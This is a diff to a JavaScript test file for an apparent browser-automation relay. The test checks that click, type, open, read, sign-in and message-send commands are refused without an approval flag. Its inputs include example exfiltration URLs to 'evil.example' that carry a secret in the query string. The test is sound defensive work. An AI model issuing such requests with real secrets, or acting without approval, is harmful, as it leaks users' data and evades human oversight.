@@ -15,7 +15,7 @@ const cmd = (env, body) => api(env, 'relay/cmd', { method: 'POST', body, headers
 
 test('click, type, open and a read by address are refused without the approval flag; nothing reaches the Relay', async () => {
   const { env, sent } = relayEnv();
-  for (const [c, args] of [['click', { tabId: 1, element: 2 }], ['type', { tabId: 1, element: 2, text: 'x' }], ['open', { url: 'https://evil.example/c?d=SECRET' }],
+  for (const [c, args] of [['click', { tabId: 1, element: 2 }], ['signin', { tabId: 1 }], ['messages', { op: 'send', to: '+1', text: 'hi' }], ['type', { tabId: 1, element: 2, text: 'x' }], ['open', { url: 'https://evil.example/c?d=SECRET' }],
     ['read', { url: 'https://evil.example/r?d=SECRET' }], ['read', { tabId: 4, url: 'https://evil.example/r' }]]) {
     for (const approved of [undefined, false, 'true', 1]) {
       const r = await cmd(env, { cmd: c, args, ...(approved === undefined ? {} : { approved }) });
